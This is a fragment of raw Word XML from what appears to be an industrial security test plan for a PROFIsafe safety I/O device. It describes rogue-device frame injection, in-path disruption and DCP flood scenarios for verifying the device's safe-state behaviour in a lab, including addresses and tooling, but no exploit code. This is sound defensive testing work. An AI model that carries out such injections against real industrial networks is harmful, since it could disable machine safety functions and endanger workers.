              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D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2A6BF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A connecting/in-path device </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>disrupts</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the black channel &gt; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_WD_Time</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; observe passivation (outputs Low, qualifier bad) + acknowledged re-integration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3B28C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Connection-induced disruption resolves to the </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>safe state</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (fail-safe outcome of RQ-001)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57170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MITRE ATT&amp;CK for ICS </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>T0814</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> context; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> watchdog theory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DA197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SVV-2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="10169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A1936" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="2" w:author="Unknown">
              <w:r w:rsidRPr="0006297D">
                <w:delText>TS-5 — DCP set/reset flood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25DB87" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D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37248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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Moved → RQ-011</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (unauthenticated DCP) / </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>RQ-010</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (flood)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3FC63" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D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63FB4" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>—</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4DF019EE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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scope note:</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> TS-4 is framed as </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>a connected device disrupting communication → safe state</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (the RQ-001 outcome), not as DoS-resilience-in-general; </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>generalized flooding/fuzzing is cross-referenced to RQ-010 (TC-RQ010-02/03).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1FA12C" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Environment binding: TS-3 side-inject on the Pi (eth0 = 192.168.0.100, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EtherType</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x8892), captured on the laptop mirror; TS-4 uses the </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>in-path 2-port bridge</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (temporary re-cabling per Zone-B §10), then reverts to side-inject. </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:history="1">
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId21" w:history="1">
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B76C311" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:pict w14:anchorId="32369A69">
          <v:rect id="_x0000_i1354" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="262631DA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>Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22534766" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Full entries for the baseline (TS-1), the rogue-device injection </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>centrepiece</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (TS-3), the connection-disruption safe-state test (TS-4), and the reachability enumeration (TS-2). </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>No</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> DCP-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>flood</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>entry</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve"> (→ RQ-011/RQ-010).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FE6C74E" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:pict w14:anchorId="73CE8043">
          <v:rect id="_x0000_i1355" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0378DE78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 xml:space="preserve">TC-RQ001-01 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PROFIsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Integrity in Normal Operation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EFB610F" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006297D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716"/>
      </w:tblGrid>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="411415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C75085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68D084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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="0ECF0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59B6F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8BFB3" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>TC-RQ001-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="59FF5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AC994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341466" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>RQ-001 (EHSR 1.1.9) → CR 3.1 → Asset C (+ Asset A)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="0B1C7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0E634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C27B7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>Baseline (no attack) — reference for the connecting-device tests</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="15F74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2A2C5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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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B4373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SVV-1</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>Requirements-based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Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="3CD7C0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9D4E1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895CD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Demonstrate that, with a correctly configured </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and valid CRC, the F-Device exchanges cyclic safety data, sets qualifier = good, and drives outputs per the control byte.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="46177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F7FC0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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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4B819" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">1. Configure the F-Host with </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> matching the DUT. 2. Establish </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> connection → OPERATE. 3. Toggle a safe input and a safe output. </w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">4. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>Record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process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data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>qualifiers</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">, CRC </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>over</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> ≥ 60 s.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="5F78F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1E7E5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lastRenderedPageBreak/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9E3E7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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> qualifier = good throughout, outputs mirror the commanded control byte, and no passivation occurs nominally. </w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> on spurious passivation, qualifier=bad, or output/command mismatch.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3EF9084D" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D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6810"/>
        <w:gridCol w:w="96"/>
        <w:gridCol w:w="765"/>
      </w:tblGrid>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="192662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C0521A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1AB15F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136227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A94770" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="197BB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5791C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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297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42B46" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>TC-RQ001-01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CD8E7" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum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9B96F" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="037EE2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82377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55762" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>SPS 192.168.0.1; SRIO DUT 192.168.0.2 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> via </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>rotary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> switch); Laptop </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>mirror</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (Wireshark, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>no</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> IP)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62B90" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum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1E870" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="18813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8FD12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17202" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>TIA Portal (F-Host), Wireshark (`</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>pn_rt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F81BB" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum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0B5F4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t>pnio</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>`)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="06340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E94E49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Procedure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D1905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(1) Download safety program, set </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_Dest_Add</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>; (2) PLC→RUN; (3) capture on mirror; (4) force Q bit → observe DO; (5) stimulate F-DI → observe input in PLC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587C5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657D3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</w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="7A65C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E4BA6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8DD58" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>☐ PASS ☐ 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06217" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum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0067D" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="1DA2A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D7B02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4D1F8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>TC01_baseline.pcapng, PLC watch-table screenshot, timestamped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7F38F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76DF9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</w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="03BB9F5F" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:pict w14:anchorId="541B8D8A">
          <v:rect id="_x0000_i1356" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FDDB3BC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>TC-RQ001-02 — Rogue-Device Forged / Tampered Frame Injection (G-1 verification + G-2 boundary)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0745244B" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006297D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7763"/>
      </w:tblGrid>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="5FBFA3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8E016E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D98492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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="01E9A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1294B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A0CCC" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>TC-RQ001-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="0B53A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7F5C3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C353F" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>RQ-001 → CR 3.1 (+RE1) / CR 1.2 → Asset C, Asset F</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="2ACED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53DE2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3C524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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Spoofing + Tampering</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (connecting rogue device)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="4227C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5A1A9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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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7AD15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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
